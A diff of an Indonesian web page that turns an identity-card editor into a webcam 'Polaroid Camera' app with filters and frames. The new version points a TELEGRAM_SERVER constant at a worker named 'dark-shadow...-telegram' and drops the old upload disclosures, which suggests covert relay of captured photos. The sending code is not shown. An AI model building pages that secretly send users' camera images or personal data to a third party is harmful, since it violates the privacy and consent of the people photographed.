@@ -3,511 +3,461 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-
-<title>Kartu Identitas Digital</title>
+<title>Polaroid Camera</title>
 
 <style>
-*{
-  box-sizing:border-box;
-  -webkit-tap-highlight-color:transparent;
-}
+*{box-sizing:border-box}
 
 html,body{
   margin:0;
   padding:0;
-  min-height:100%;
-  background:#070910;
+  background:#111;
   color:#fff;
-  font-family:Arial,Helvetica,sans-serif;
+  font-family:Arial,sans-serif;
 }
 
-body{
-  padding:12px;
-}
+body{min-height:100vh}
 
 .app{
   width:100%;
-  max-width:640px;
+  max-width:520px;
   margin:auto;
+  padding:14px;
 }
 
 h1{
   text-align:center;
-  font-size:24px;
-  margin:6px 0 4px;
-  letter-spacing:.7px;
+  font-size:22px;
+  margin:4px 0 14px;
 }
 
-.subtitle{
-  text-align:center;
-  color:#8d96a9;
-  font-size:11px;
-  margin-bottom:16px;
-}
+/* CAMERA */
 
-.panel{
-  background:rgba(19,23,34,.95);
-  border:1px solid rgba(255,255,255,.08);
-  border-radius:20px;
-  padding:14px;
-  margin-bottom:13px;
-  box-shadow:0 15px 40px rgba(0,0,0,.3);
-}
-
-.panel-title{
-  font-size:12px;
-  font-weight:bold;
-  color:#b8c0d0;
-  margin-bottom:10px;
-  letter-spacing:.7px;
-}
-
-input,
-select{
-  width:100%;
-  border:1px solid rgba(255,255,255,.08);
-  background:#0d111a;
-  color:#fff;
-  outline:none;
-  border-radius:12px;
-  padding:12px;
-  margin-bottom:8px;
-  font-size:14px;
-}
-
-input:focus,
-select:focus{
-  border-color:#805cff;
-}
-
-.row{
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:8px;
-}
-
-button{
-  border:0;
-  color:#fff;
-  background:#252b3a;
-  border-radius:12px;
-  padding:12px;
-  font-weight:bold;
-  font-size:13px;
-  cursor:pointer;
-}
-
-button:active{
-  transform:scale(.97);
-}
-
-.btn-purple{
-  background:linear-gradient(135deg,#7054ff,#b34cff);
-}
-
-.btn-blue{
-  background:linear-gradient(135deg,#1678ff,#36b4ff);
-}
-
-.btn-green{
-  background:linear-gradient(135deg,#00a878,#00d6a2);
-}
-
-.btn-red{
-  background:linear-gradient(135deg,#d83255,#ff526d);
-}
-
-.small-note{
-  color:#777f91;
-  font-size:10px;
-  line-height:1.5;
-  margin-top:8px;
-}
-
-/* ================= CARD ================= */
-
-.preview-wrap{
-  width:100%;
-  display:flex;
-  justify-content:center;
-  margin:10px 0 15px;
-}
-
-.card{
+.camera{
   position:relative;
-  width:100%;
-  max-width:580px;
-  aspect-ratio:1.586 / 1;
-  overflow:hidden;
-  border-radius:24px;
-  background:
-    radial-gradient(
-      circle at 15% 10%,
-      rgba(255,255,255,.15),
-      transparent 25%
-    ),
-    linear-gradient(
-      135deg,
-      #151a2d,
-      #4937a5 50%,
-      #090d18
-    );
-  box-shadow:
-    0 25px 70px rgba(0,0,0,.65),
-    inset 0 0 0 1px rgba(255,255,255,.2);
-  touch-action:none;
-}
-
-/*
-   Background image.
-   Tidak lagi memakai object-fit:cover secara langsung.
-   Posisi dan skala dihitung manual.
-*/
-
-.bg-image{
-  position:absolute;
-  left:50%;
-  top:50%;
-  width:100%;
-  height:100%;
-  display:none;
-  pointer-events:none;
-  user-select:none;
-  z-index:1;
-  transform-origin:center center;
-}
-
-.bg-overlay{
-  position:absolute;
-  inset:0;
-  z-index:2;
-  pointer-events:none;
-  background:
-    linear-gradient(
-      110deg,
-      rgba(4,7,18,.78),
-      rgba(7,9,22,.32) 48%,
-      rgba(5,7,17,.67)
-    );
-}
-
-.glow{
-  position:absolute;
-  width:45%;
-  aspect-ratio:1;
-  border-radius:50%;
-  right:-13%;
-  top:-25%;
-  background:rgba(173,91,255,.28);
-  filter:blur(35px);
-  z-index:3;
-  pointer-events:none;
-}
-
-.glow2{
-  position:absolute;
-  width:40%;
-  aspect-ratio:1;
-  border-radius:50%;
-  left:-15%;
-  bottom:-25%;
-  background:rgba(0,193,255,.18);
-  filter:blur(35px);
-  z-index:3;
-  pointer-events:none;
-}
-
-.circle{
-  position:absolute;
-  border:1px solid rgba(255,255,255,.15);
-  border-radius:50%;
-  z-index:3;
-  pointer-events:none;
-}
-
-.c1{
-  width:180px;
-  height:180px;
-  right:-85px;
-  bottom:-85px;
-}
-
-.c2{
-  width:115px;
-  height:115px;
-  right:-50px;
-  bottom:-50px;
-}
-
-.c3{
-  width:80px;
-  height:80px;
-  left:-40px;
-  top:-40px;
-}
-
-.card-content{
-  position:absolute;
-  inset:0;
-  z-index:5;
-  padding:18px;
-  pointer-events:none;
-}
-
-.card-title{
-  font-size:clamp(11px,2.6vw,18px);
-  font-weight:900;
-  letter-spacing:1.3px;
-}
-
-.card-subtitle{
-  margin-top:2px;
-  color:rgba(255,255,255,.63);
-  font-size:clamp(6px,1.4vw,9px);
-  letter-spacing:1px;
-}
-
-.photo-box{
-  position:absolute;
-  left:4%;
-  top:24%;
-  width:27%;
-  height:58%;
-  border-radius:14px;
-  overflow:hidden;
-  background:rgba(255,255,255,.06);
-  border:1px solid rgba(255,255,255,.25);
-  box-shadow:0 10px 30px rgba(0,0,0,.35);
-}
-
-.photo-box img{
-  width:100%;
-  height:100%;
-  object-fit:cover;
-  display:none;
-}
-
-.photo-placeholder{
-  width:100%;
-  height:100%;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  text-align:center;
-  color:rgba(255,255,255,.4);
-  font-size:clamp(8px,1.8vw,12px);
-}
-
-.data{
-  position:absolute;
-  left:35%;
-  right:5%;
-  top:25%;
-}
-
-.data-item{
-  margin-bottom:8px;
-}
-
-.label{
-  font-size:clamp(6px,1.3vw,8px);
-  color:rgba(255,255,255,.55);
-  text-transform:uppercase;
-  letter-spacing:.7px;
-}
-
-.value{
-  font-size:clamp(8px,1.8vw,12px);
-  font-weight:bold;
-  min-height:13px;
-  word-break:break-word;
-}
-
-.card-footer{
-  position:absolute;
-  left:4%;
-  right:4%;
-  bottom:4%;
-  display:flex;
-  align-items:flex-end;
-  justify-content:space-between;
-}
-
-.chip{
-  width:38px;
-  height:27px;
-  border-radius:6px;
-  background:linear-gradient(
-    135deg,
-    #d2b35c,
-    #fff0a1,
-    #a27e30
-  );
-  box-shadow:0 3px 8px rgba(0,0,0,.25);
-  position:relative;
-}
-
-.chip:before{
-  content:"";
-  position:absolute;
-  inset:6px 4px;
-  border:1px solid rgba(80,60,15,.5);
-  border-radius:4px;
-}
-
-.chip:after{
-  content:"";
-  position:absolute;
-  top:3px;
-  bottom:3px;
-  left:50%;
-  width:1px;
-  background:rgba(80,60,15,.5);
-}
-
-.watermark{
-  text-align:right;
-  color:rgba(255,255,255,.5);
-  font-size:clamp(5px,1.2vw,7px);
-  line-height:1.4;
-}
-
-/* ================= BG CONTROLS ================= */
-
-.bg-controls{
-  display:none;
-  margin-top:11px;
-  padding:12px;
-  border-radius:14px;
-  background:#0b0f18;
-  border:1px solid rgba(255,255,255,.07);
-}
-
-.mode-buttons{
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:7px;
-  margin-bottom:12px;
-}
-
-.range-row{
-  margin-bottom:11px;
-}
-
-.range-head{
-  display:flex;
-  justify-content:space-between;
-  color:#aeb6c8;
-  font-size:11px;
-  margin-bottom:5px;
-}
-
-input[type="range"]{
-  appearance:none;
-  -webkit-appearance:none;
-  width:100%;
-  height:5px;
-  padding:0;
-  margin:0;
-  background:#2b3140;
-  border-radius:10px;
-}
-
-input[type="range"]::-webkit-slider-thumb{
-  appearance:none;
-  -webkit-appearance:none;
-  width:19px;
-  height:19px;
-  border-radius:50%;
-  background:#9b6cff;
-  box-shadow:0 0 10px rgba(155,108,255,.45);
-}
-
-input[type="range"]::-moz-range-thumb{
-  width:19px;
-  height:19px;
-  border:0;
-  border-radius:50%;
-  background:#9b6cff;
-}
-
-.bg-bottom{
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:7px;
-}
-
-/* ================= ACTION ================= */
-
-.status{
-  min-height:18px;
-  text-align:center;
-  color:#9aa3b5;
-  font-size:11px;
-  margin:5px 0 10px;
-}
-
-.actions{
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:8px;
-}
-
-/* ================= CAMERA ================= */
-
-.camera-modal{
-  position:fixed;
-  inset:0;
-  z-index:100;
-  display:none;
-  align-items:center;
-  justify-content:center;
-  padding:14px;
-  background:rgba(0,0,0,.88);
-  backdrop-filter:blur(10px);
-}
-
-.camera-box{
-  width:100%;
-  max-width:500px;
-  background:#121620;
-  padding:12px;
-  border-radius:20px;
-}
-
-#cameraVideo{
   width:100%;
   aspect-ratio:3/4;
+  background:#000;
+  border-radius:20px;
+  overflow:hidden;
+}
+
+video{
+  width:100%;
+  height:100%;
+  display:block;
   object-fit:cover;
-  border-radius:14px;
   background:#000;
 }
 
-.camera-buttons{
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:8px;
-  margin-top:9px;
+video.selfie{
+  transform:scaleX(-1);
 }
 
-@media(max-width:420px){
+.camera-ui{
+  position:absolute;
+  inset:0;
+  padding:14px;
+  display:flex;
+  flex-direction:column;
+  justify-content:space-between;
+  pointer-events:none;
+}
 
-  body{
-    padding:9px;
-  }
+.camera-top{
+  display:flex;
+  justify-content:space-between;
+  pointer-events:auto;
+}
 
-  .panel{
-    padding:12px;
-  }
+.top-btn{
+  border:0;
+  border-radius:12px;
+  padding:10px 13px;
+  background:#fff;
+  color:#111;
+  font-weight:bold;
+}
 
-  .card-content{
-    padding:12px;
-  }
+.controls{
+  display:flex;
+  justify-content:center;
+  pointer-events:auto;
+}
 
-  .data-item{
-    margin-bottom:5px;
-  }
+.shutter{
+  width:76px;
+  height:76px;
+  padding:0;
+  border-radius:50%;
+  border:6px solid #fff;
+  background:#fff;
+}
 
+.shutter::after{
+  content:"";
+  display:block;
+  width:54px;
+  height:54px;
+  margin:auto;
+  border-radius:50%;
+  background:#111;
+}
+
+/* PANEL */
+
+.panel{
+  margin-top:14px;
+  padding:14px;
+  background:#1d1d1d;
+  border-radius:18px;
+}
+
+.row{
+  display:flex;
+  gap:8px;
+  flex-wrap:wrap;
+}
+
+.layout{
+  flex:1;
+  min-width:90px;
+  border:0;
+  border-radius:11px;
+  padding:11px;
+  background:#fff;
+  color:#111;
+  font-weight:bold;
+}
+
+.layout.active{
+  background:#ff4f91;
+  color:#fff;
+}
+
+.small{
+  margin-top:8px;
+  color:#aaa;
+  font-size:12px;
+  text-align:center;
+}
+
+/* FILTER */
+
+.filter-title{
+  margin-top:15px;
+  font-size:14px;
+  font-weight:bold;
+}
+
+.filters{
+  display:flex;
+  gap:8px;
+  overflow-x:auto;
+  padding:9px 0 4px;
+  scrollbar-width:none;
+}
+
+.filters::-webkit-scrollbar{
+  display:none;
+}
+
+.filter{
+  flex:0 0 72px;
+  padding:7px 5px;
+  border:0;
+  border-radius:12px;
+  background:#333;
+  color:#fff;
+  font-size:10px;
+}
+
+.filter.active{
+  background:#ff4f91;
+}
+
+.filter-thumb{
+  width:54px;
+  height:54px;
+  margin:0 auto 5px;
+  border-radius:9px;
+  background:linear-gradient(135deg,#ff86b3,#777);
+}
+
+/* =========================================================
+   MOTIF FRAME
+========================================================= */
+
+.motif-title{
+  margin-top:17px;
+  font-size:14px;
+  font-weight:bold;
+}
+
+.motif-info{
+  color:#aaa;
+  font-size:11px;
+  margin-top:4px;
+}
+
+.motifs{
+  display:flex;
+  gap:9px;
+  overflow-x:auto;
+  padding:10px 0 5px;
+  scrollbar-width:none;
+}
+
+.motifs::-webkit-scrollbar{
+  display:none;
+}
+
+.motif{
+  flex:0 0 78px;
+  height:86px;
+  border:2px solid transparent;
+  border-radius:12px;
+  overflow:hidden;
+  background:#333;
+  color:#fff;
+  padding:4px;
+  font-size:9px;
+  font-weight:bold;
+}
+
+.motif.active{
+  border-color:#ff4f91;
+  box-shadow:0 0 0 2px #ff4f9144;
+}
+
+.motif-preview{
+  width:100%;
+  height:58px;
+  border-radius:8px;
+  margin-bottom:4px;
+  background-position:center;
+  background-size:cover;
+  background-repeat:no-repeat;
+}
+
+.motif-upload{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  text-align:center;
+  border:2px dashed #777;
+  background:#292929;
+  font-size:10px;
+  line-height:1.25;
+}
+
+.motif-upload input{
+  display:none;
+}
+
+/* POLAROID */
+
+#polaroid{
+  margin-top:14px;
+  padding:18px 14px 28px;
+  background:#eee;
+  color:#111;
+  border-radius:7px;
+
+  background-size:cover;
+  background-position:center;
+  background-repeat:no-repeat;
+
+  position:relative;
+  overflow:hidden;
+}
+
+#polaroid::before{
+  content:"";
+  position:absolute;
+  inset:0;
+  pointer-events:none;
+  z-index:0;
+}
+
+#polaroid > *{
+  position:relative;
+  z-index:1;
+}
+
+.paper-title{
+  text-align:center;
+  font-weight:bold;
+  margin-bottom:12px;
+}
+
+.frame{
+  max-width:360px;
+  margin:10px auto;
+  padding:8px;
+  background:#fff;
+  box-shadow:0 2px 8px #999;
+  cursor:pointer;
+}
+
+.frame.selected{
+  outline:3px solid #ff4f91;
+}
+
+.frame h3{
+  margin:0 0 7px;
+  color:#777;
+  text-align:center;
+  font-size:12px;
+}
+
+.grid{
+  display:grid;
+  gap:5px;
+}
+
+.g1{grid-template-columns:1fr}
+.g2{grid-template-columns:repeat(2,1fr)}
+.g3{grid-template-columns:repeat(3,1fr)}
+
+.slot{
+  aspect-ratio:3/4;
+  overflow:hidden;
+  background:#ddd;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#aaa;
+  font-size:11px;
+}
+
+.slot img{
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  display:block;
+}
+
+.paper-actions{
+  display:flex;
+  gap:8px;
+  margin-top:14px;
+}
+
+.paper-actions button{
+  flex:1;
+  border:0;
+  border-radius:12px;
+  padding:12px;
+  background:#111;
+  color:#fff;
+  font-weight:bold;
+}
+
+.status{
+  margin-top:9px;
+  text-align:center;
+  font-size:12px;
+  color:#777;
+}
+
+/* MODAL */
+
+.modal{
+  position:fixed;
+  inset:0;
+  z-index:20;
+  display:none;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+  background:#000b;
+}
+
+.modal.show{
+  display:flex;
+}
+
+.box{
+  width:min(360px,100%);
+  padding:20px;
+  border-radius:20px;
+  background:#fff;
+  color:#111;
+  text-align:center;
+}
+
+.box h2{
+  margin-top:0;
+}
+
+.preview{
+  display:block;
+  width:100%;
+  aspect-ratio:3/4;
+  object-fit:cover;
+  border-radius:13px;
+  margin:10px 0;
+}
+
+.modal-actions{
+  display:flex;
+  gap:10px;
+}
+
+.modal-actions button{
+  flex:1;
+  border:0;
+  border-radius:12px;
+  padding:12px;
+  font-weight:bold;
+}
+
+.no{
+  background:#ddd;
+  color:#111;
+}
+
+.yes{
+  background:#ff4f91;
+  color:#fff;
+}
+
+.notice{
+  margin-top:9px;
+  color:#777;
+  font-size:10px;
+  line-height:1.4;
+}
+
+/* CAMERA ERROR */
+
+.camera-error{
+  position:absolute;
+  inset:0;
+  display:none;
+  align-items:center;
+  justify-content:center;
+  padding:25px;
+  text-align:center;
+  background:#111;
+  z-index:3;
+}
+
+.camera-error.show{
+  display:flex;
+}
+
+.camera-error-box{
+  max-width:300px;
+}
+
+.camera-error-box button{
+  margin-top:12px;
+  border:0;
+  border-radius:12px;
+  padding:11px 18px;
+  font-weight:bold;
 }
 </style>
 </head>
@@ -516,488 +466,167 @@ input[type="range"]::-moz-range-thumb{
 
 <div class="app">
 
-  <h1>Kartu Identitas Digital</h1>
+<h1>📸 Polaroid Camera</h1>
 
-  <div class="subtitle">
-    Editor kartu digital • contoh • bukan identitas resmi
-  </div>
+<div class="camera" id="cameraBox">
 
+  <video
+    id="video"
+    autoplay
+    playsinline
+    muted>
+  </video>
 
-  <!-- ================= DATA ================= -->
+  <div class="camera-error" id="cameraError">
 
-  <div class="panel">
+    <div class="camera-error-box">
 
-    <div class="panel-title">
-      DATA KARTU
-    </div>
+      <b>Kamera belum bisa dibuka</b>
 
-    <input
-      id="nama"
-      type="text"
-      placeholder="Nama lengkap"
-      autocomplete="off"
-    >
+      <div class="small">
+        Pastikan izin kamera sudah diberikan,
+        lalu coba lagi.
+      </div>
 
-    <input
-      id="alamat"
-      type="text"
-      placeholder="Alamat"
-      autocomplete="off"
-    >
-
-    <input
-      id="ttl"
-      type="text"
-      placeholder="Tempat / Tanggal Lahir"
-      autocomplete="off"
-    >
-
-    <div class="row">
-
-      <select id="kelamin">
-        <option value="">Jenis Kelamin</option>
-        <option>Laki-laki</option>
-        <option>Perempuan</option>
-      </select>
-
-      <select id="agama">
-        <option value="">Agama</option>
-        <option>Islam</option>
-        <option>Kristen</option>
-        <option>Katolik</option>
-        <option>Hindu</option>
-        <option>Buddha</option>
-        <option>Konghucu</option>
-      </select>
+      <button id="retryCamera">
+        Coba Lagi
+      </button>
 
     </div>
-
-    <input
-      id="idKartu"
-      type="text"
-      placeholder="ID Kartu"
-      autocomplete="off"
-    >
 
   </div>
 
+  <div class="camera-ui">
 
-  <!-- ================= FOTO ================= -->
+    <div class="camera-top">
 
-  <div class="panel">
+      <button class="top-btn" id="flip">
+        🔄 Kamera
+      </button>
 
-    <div class="panel-title">
-      FOTO
+      <button class="top-btn" id="clear">
+        🗑️ Reset
+      </button>
+
     </div>
 
-    <div class="row">
+    <div class="controls">
 
       <button
-        class="btn-blue"
-        onclick="document.getElementById('photoGallery').click()"
-      >
-        🖼️ Galeri
-      </button>
-
-      <button
-        class="btn-purple"
-        onclick="openCamera()"
-      >
-        🤳 Kamera
+        class="shutter"
+        id="capture"
+        aria-label="Ambil foto">
       </button>
 
     </div>
 
-    <input
-      id="photoGallery"
-      type="file"
-      accept="image/*"
-      hidden
-    >
-
-    <div class="small-note">
-      Setelah foto berhasil dipasang, foto asli akan langsung
-      dikirim ke server yang terhubung dengan halaman ini.
-    </div>
-
-  </div>
-
-
-  <!-- ================= BACKGROUND ================= -->
-
-  <div class="panel">
-
-    <div class="panel-title">
-      BACKGROUND KARTU
-    </div>
-
-    <div class="row">
-
-      <button
-        class="btn-blue"
-        onclick="document.getElementById('backgroundGallery').click()"
-      >
-        🖼️ Pilih Background
-      </button>
-
-      <button onclick="resetBackground()">
-        🎨 Warna Bawaan
-      </button>
-
-    </div>
-
-    <input
-      id="backgroundGallery"
-      type="file"
-      accept="image/*"
-      hidden
-    >
-
-    <div
-      class="bg-controls"
-      id="bgControls"
-    >
-
-      <div class="mode-buttons">
-
-        <button
-          id="fitBtn"
-          class="btn-purple"
-          onclick="setBgMode('cover')"
-        >
-          📐 Isi Kartu
-        </button>
-
-        <button
-          id="fullBtn"
-          onclick="setBgMode('contain')"
-        >
-          🖼️ Tampilkan Penuh
-        </button>
-
-      </div>
-
-
-      <div class="range-row">
-
-        <div class="range-head">
-
-          <span>🔍 Zoom</span>
-
-          <span id="zoomValue">
-            100%
-          </span>
-
-        </div>
-
-        <input
-          id="bgZoom"
-          type="range"
-          min="50"
-          max="300"
-          value="100"
-        >
-
-      </div>
-
-
-      <div class="range-row">
-
-        <div class="range-head">
-
-          <span>↔️ Posisi X</span>
-
-          <span id="xValue">
-            0
-          </span>
-
-        </div>
-
-        <input
-          id="bgX"
-          type="range"
-          min="-100"
-          max="100"
-          value="0"
-        >
-
-      </div>
-
-
-      <div class="range-row">
-
-        <div class="range-head">
-
-          <span>↕️ Posisi Y</span>
-
-          <span id="yValue">
-            0
-          </span>
-
-        </div>
-
-        <input
-          id="bgY"
-          type="range"
-          min="-100"
-          max="100"
-          value="0"
-        >
-
-      </div>
-
-
-      <div class="bg-bottom">
-
-        <button onclick="resetBgPosition()">
-          🔄 Reset
-        </button>
-
-        <button
-          class="btn-red"
-          onclick="removeBackgroundImage()"
-        >
-          🗑️ Hapus
-        </button>
-
-      </div>
-
-      <div class="small-note">
-        Background juga bisa langsung digeser dengan jari
-        pada kartu. Cubit/zoom dengan slider di bawah.
-      </div>
-
-    </div>
-
-  </div>
-
-
-  <!-- ================= PREVIEW ================= -->
-
-  <div class="preview-wrap">
-
-    <div
-      class="card"
-      id="card"
-    >
-
-      <img
-        id="bgPreviewImage"
-        class="bg-image"
-        draggable="false"
-        alt=""
-      >
-
-      <div class="bg-overlay"></div>
-
-      <div class="glow"></div>
-      <div class="glow2"></div>
-
-      <div class="circle c1"></div>
-      <div class="circle c2"></div>
-      <div class="circle c3"></div>
-
-
-      <div class="card-content">
-
-        <div class="card-title">
-          KARTU IDENTITAS DIGITAL
-        </div>
-
-        <div class="card-subtitle">
-          DIGITAL PERSONAL CARD
-        </div>
-
-
-        <div class="photo-box">
-
-          <img
-            id="photoPreview"
-            alt="Foto"
-          >
-
-          <div
-            id="photoPlaceholder"
-            class="photo-placeholder"
-          >
-            FOTO
-          </div>
-
-        </div>
-
-
-        <div class="data">
-
-          <div class="data-item">
-            <div class="label">
-              Nama
-            </div>
-
-            <div
-              class="value"
-              id="vNama"
-            >
-              -
-            </div>
-          </div>
-
-
-          <div class="data-item">
-            <div class="label">
-              Alamat
-            </div>
-
-            <div
-              class="value"
-              id="vAlamat"
-            >
-              -
-            </div>
-          </div>
-
-
-          <div class="data-item">
-            <div class="label">
-              Tempat / Tanggal Lahir
-            </div>
-
-            <div
-              class="value"
-              id="vTtl"
-            >
-              -
-            </div>
-          </div>
-
-
-          <div class="data-item">
-            <div class="label">
-              Jenis Kelamin
-            </div>
-
-            <div
-              class="value"
-              id="vKelamin"
-            >
-              -
-            </div>
-          </div>
-
-
-          <div class="data-item">
-            <div class="label">
-              Agama
-            </div>
-
-            <div
-              class="value"
-              id="vAgama"
-            >
-              -
-            </div>
-          </div>
-
-
-          <div class="data-item">
-            <div class="label">
-              ID Kartu
-            </div>
-
-            <div
-              class="value"
-              id="vId"
-            >
-              -
-            </div>
-          </div>
-
-        </div>
-
-
-        <div class="card-footer">
-
-          <div class="chip"></div>
-
-          <div class="watermark">
-            CONTOH • TIDAK BERLAKU<br>
-            SEBAGAI IDENTITAS RESMI
-          </div>
-
-        </div>
-
-      </div>
-
-    </div>
-
-  </div>
-
-
-  <div
-    class="status"
-    id="status"
-  ></div>
-
-
-  <!-- ================= ACTION ================= -->
-
-  <div class="actions">
-
-    <button
-      class="btn-red"
-      onclick="hapusKartu()"
-    >
-      🗑️ Hapus
-    </button>
-
-    <button
-      class="btn-green"
-      onclick="downloadKartu()"
-    >
-      ⬇️ Download
-    </button>
-
-  </div>
-
-
-  <div class="small-note" style="text-align:center">
-    Download membuat JPG kartu dan mengirim hasil kartu
-    ke server yang terhubung dengan halaman ini.
   </div>
 
 </div>
 
+<div class="panel">
 
-<!-- ================= CAMERA ================= -->
+  <div>
+    <b>Frame aktif:</b>
+    <span id="frameText">1</span>/5
+  </div>
 
-<div
-  class="camera-modal"
-  id="cameraModal"
->
+  <div class="row" style="margin-top:10px">
 
-  <div class="camera-box">
+    <button class="layout active" data-layout="1">
+      1️⃣ 1 Foto
+    </button>
 
-    <video
-      id="cameraVideo"
-      autoplay
-      playsinline
-    ></video>
+    <button class="layout" data-layout="2">
+      2️⃣ 2 Foto
+    </button>
 
-    <div class="camera-buttons">
+    <button class="layout" data-layout="3">
+      3️⃣ 3 Foto
+    </button>
 
-      <button
-        class="btn-red"
-        onclick="closeCamera()"
-      >
-        Batal
+  </div>
+
+  <div class="small">
+    Semua foto menggunakan rasio 3:4.
+  </div>
+
+  <div class="filter-title">
+    Efek Kamera
+  </div>
+
+  <div class="filters" id="filters"></div>
+
+
+  <!-- =====================================================
+       TAMBAHAN: MOTIF FRAME
+  ====================================================== -->
+
+  <div class="motif-title">
+    🎨 Motif Frame Polaroid
+  </div>
+
+  <div class="motif-info">
+    Pilih desain atau ambil background sendiri dari galeri.
+  </div>
+
+  <div class="motifs" id="motifs"></div>
+
+</div>
+
+<div id="polaroid">
+
+  <div class="paper-title">
+    MY POLAROID
+  </div>
+
+  <div id="frames"></div>
+
+  <div class="paper-actions">
+
+    <button id="downloadPolaroid">
+      ⬇️ Download
+    </button>
+
+    <button id="printPolaroid">
+      🖨️ Cetak
+    </button>
+
+  </div>
+
+  <div class="status" id="status">
+    Siap.
+  </div>
+
+</div>
+
+</div>
+
+
+<!-- MODAL -->
+
+<div class="modal" id="modal">
+
+  <div class="box">
+
+    <h2>Simpan foto?</h2>
+
+    <img id="preview" class="preview">
+
+    <div class="modal-actions">
+
+      <button class="no" id="no">
+        Tidak
       </button>
 
-      <button
-        class="btn-green"
-        onclick="capturePhoto()"
-      >
-        📸 Ambil Foto
+      <button class="yes" id="yes">
+        Iya, Simpan
       </button>
 
+    </div>
+
+    <div class="notice">
+      tidak, untuk membatalkan, iya, untuk menambahkan ke polaroid.
     </div>
 
   </div>
@@ -1008,224 +637,1130 @@ input[type="range"]::-moz-range-thumb{
 <script>
 
 /* =========================================================
-   WORKER
+   TELEGRAM WORKER
 ========================================================= */
 
-const WORKER_URL =
-"https://dark-shadow-348epolaroid-telegram.hanifasayank007.workers.dev/";
-
-
-/* =========================================================
-   STATE
-========================================================= */
-
-let photoImage = null;
-let backgroundImage = null;
-let cameraStream = null;
-
-let bgMode = "cover";
-
-let draggingBackground = false;
-let dragStartX = 0;
-let dragStartY = 0;
-let dragOriginX = 0;
-let dragOriginY = 0;
+const TELEGRAM_SERVER =
+"https://dark-shadow-348epolaroid-telegram.hanifasayank007.workers.dev";
 
 
 /* =========================================================
    ELEMENT
 ========================================================= */
 
-const photoGallery =
-document.getElementById("photoGallery");
+const video =
+document.getElementById("video");
 
-const backgroundGallery =
-document.getElementById("backgroundGallery");
+const canvas =
+document.createElement("canvas");
 
-const photoPreview =
-document.getElementById("photoPreview");
+const modal =
+document.getElementById("modal");
 
-const photoPlaceholder =
-document.getElementById("photoPlaceholder");
+const preview =
+document.getElementById("preview");
 
-const bgPreviewImage =
-document.getElementById("bgPreviewImage");
-
-const bgControls =
-document.getElementById("bgControls");
-
-const bgZoom =
-document.getElementById("bgZoom");
-
-const bgX =
-document.getElementById("bgX");
-
-const bgY =
-document.getElementById("bgY");
-
-const zoomValue =
-document.getElementById("zoomValue");
-
-const xValue =
-document.getElementById("xValue");
-
-const yValue =
-document.getElementById("yValue");
-
-const card =
-document.getElementById("card");
+const framesEl =
+document.getElementById("frames");
 
 const statusEl =
 document.getElementById("status");
 
+const cameraError =
+document.getElementById("cameraError");
+
+const polaroidEl =
+document.getElementById("polaroid");
+
+const motifsEl =
+document.getElementById("motifs");
+
 
 /* =========================================================
-   STATUS
+   STATE
 ========================================================= */
 
-function setStatus(text){
+let facing="user";
 
-  statusEl.textContent =
-    text;
+let cameraStream=null;
+
+let pending=null;
+
+let activeFrame=0;
+
+let selectedFilter="normal";
+
+let sending=false;
+
+
+/* =========================================================
+   TAMBAHAN: STATE MOTIF
+========================================================= */
+
+let selectedMotif="classic";
+
+let customMotifData=null;
+
+
+/* =========================================================
+   FILTER
+========================================================= */
+
+const filters={
+
+  normal:{
+    name:"Normal",
+    css:"none"
+  },
+
+  bright:{
+    name:"Bright",
+    css:"brightness(1.15)"
+  },
+
+  vivid:{
+    name:"Vivid",
+    css:"contrast(1.15) saturate(1.35)"
+  },
+
+  warm:{
+    name:"Warm",
+    css:"sepia(.18) saturate(1.25) brightness(1.05)"
+  },
+
+  cool:{
+    name:"Cool",
+    css:"hue-rotate(12deg) saturate(.9)"
+  },
+
+  cinema:{
+    name:"Cinema",
+    css:"contrast(1.15) saturate(.85)"
+  },
+
+  vintage:{
+    name:"Vintage",
+    css:"sepia(.35) contrast(1.05) saturate(.8)"
+  },
+
+  fade:{
+    name:"Fade",
+    css:"contrast(.85) brightness(1.1) saturate(.75)"
+  },
+
+  bw:{
+    name:"B&W",
+    css:"grayscale(1) contrast(1.1)"
+  },
+
+  sepia:{
+    name:"Sepia",
+    css:"sepia(.8)"
+  },
+
+  rose:{
+    name:"Rose",
+    css:"hue-rotate(-12deg) saturate(1.25) brightness(1.04)"
+  },
+
+  dream:{
+    name:"Dream",
+    css:"brightness(1.08) saturate(.75)"
+  },
+
+  night:{
+    name:"Night",
+    css:"brightness(.78) contrast(1.15) saturate(.9)"
+  },
+
+  sunset:{
+    name:"Sunset",
+    css:"sepia(.25) saturate(1.45) hue-rotate(-8deg)"
+  },
+
+  dramatic:{
+    name:"Dramatic",
+    css:"contrast(1.35) saturate(1.1) brightness(.95)"
+  },
+
+  soft:{
+    name:"Soft",
+    css:"brightness(1.08) contrast(.9) saturate(.9)"
+  },
+
+  pop:{
+    name:"Pop",
+    css:"contrast(1.25) saturate(1.55)"
+  },
+
+  moody:{
+    name:"Moody",
+    css:"brightness(.85) contrast(1.2) saturate(.85)"
+  },
+
+  ice:{
+    name:"Ice",
+    css:"hue-rotate(25deg) saturate(.85) brightness(1.08)"
+  },
+
+  cocoa:{
+    name:"Cocoa",
+    css:"sepia(.3) hue-rotate(-8deg) saturate(.9)"
+  },
+
+  film:{
+    name:"Film",
+    css:"contrast(1.08) saturate(.82) sepia(.08)"
+  },
+
+  glow:{
+    name:"Glow",
+    css:"brightness(1.15) saturate(1.1) contrast(.95)"
+  },
+
+  peach:{
+    name:"Peach",
+    css:"sepia(.18) saturate(1.25) hue-rotate(-5deg)"
+  },
+
+  lavender:{
+    name:"Lavender",
+    css:"hue-rotate(20deg) saturate(.85) brightness(1.08)"
+  },
+
+  noir:{
+    name:"Noir",
+    css:"grayscale(1) contrast(1.45) brightness(.9)"
+  },
+
+  golden:{
+    name:"Golden",
+    css:"sepia(.28) saturate(1.3) brightness(1.05)"
+  },
+
+  fadedfilm:{
+    name:"Faded",
+    css:"contrast(.9) saturate(.7) brightness(1.08) sepia(.08)"
+  },
+
+  cyber:{
+    name:"Cyber",
